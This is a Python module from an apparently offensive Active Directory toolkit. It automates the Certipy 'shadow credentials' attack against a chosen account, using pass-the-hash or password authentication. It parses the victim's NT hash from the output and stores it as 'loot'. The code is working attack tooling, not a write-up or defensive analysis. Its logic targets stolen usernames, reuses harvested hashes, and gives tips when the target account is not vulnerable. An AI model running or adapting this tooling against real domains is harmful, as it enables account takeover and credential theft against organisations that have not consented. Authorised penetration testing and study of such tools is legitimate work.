import os
import re
from core.colors import red, green, yellow, blue
from core.helpers import run_command, select_from_list, save_loot

def attack_shadow(session, parts, session_mgr=None):
    print(blue("[*] Starting Certipy shadow extraction..."))

    # === Prompt for controlled user if not passed
    if parts and len(parts) >= 1:
        target = parts[0]
    else:
        loot_file = "loot/valid_users.txt"
        print("[?] Do you want to load usernames from file or type manually?")
        print("  [1] Load from file")
        print("  [2] Type manually")
        choice = input("[>] Select option [1/2]: ").strip()

        if choice == "1" and os.path.exists(loot_file):
            with open(loot_file, "r") as f:
                users = [line.strip() for line in f if line.strip()]
            if users:
                target = select_from_list(users, "Select user to shadow")
            else:
                print(red("[-] File is empty. Falling back to manual input."))
                target = input("[?] Enter target username: ").strip()
        else:
            target = input("[?] Enter target username: ").strip()

    extract_shadow_hash(session, target)


def extract_shadow_hash(session, controlled_user):
    controlled_user = controlled_user.strip().lower()
    hash_path = f"loot/{controlled_user}.hash"

    # === Check for existing hash
    if os.path.exists(hash_path):
        print(green(f"[+] Reusing previously extracted hash for {controlled_user}"))
        with open(hash_path, "r") as f:
            for line in f:
                line = line.strip()
                if re.fullmatch(r"[a-fA-F0-9]{32}", line):
                    print(green(f"[+] Extracted NT hash: {line}"))
                    return
        print(yellow("[!] Hash file exists but no valid NT hash was found."))
        return

    # === Build certipy command
    if session.hash:
        auth = f"-u {session.username}@{session.domain} -hashes {session.hash}"
    elif session.password:
        auth = f"-u {session.username}@{session.domain} -p '{session.password}'"
    else:
        print(red("[-] No credentials available to perform shadow attack."))
        return

    cmd = f"certipy-ad shadow auto {auth} -account {controlled_user}"
    print(blue(f"[*] Running: {cmd}"))

    out, err = run_command(cmd)
    combined = out + "\n" + err

    # === Attempt to parse NT hash
    match = re.search(r"NT hash for .*?:\s*([a-fA-F0-9]{32})", combined)
    if match:
        nt_hash = match.group(1)
        print(green(f"[+] Extracted NT hash: {nt_hash}"))
        save_loot(f"{controlled_user}.hash", nt_hash)
        return

    # === Handle failure
    print(red("[!] Failed to extract shadow hash."))
    if "AccessDenied" in combined or "denied" in combined.lower():
        print(yellow("[!] Access denied — ensure you have rights to shadow this account."))
    elif "is not vulnerable" in combined:
        print(yellow("[*] Target may not be vulnerable or misconfigured for shadow attack."))
    else:
        print(yellow("[*] Full output below:"))
        print(combined)
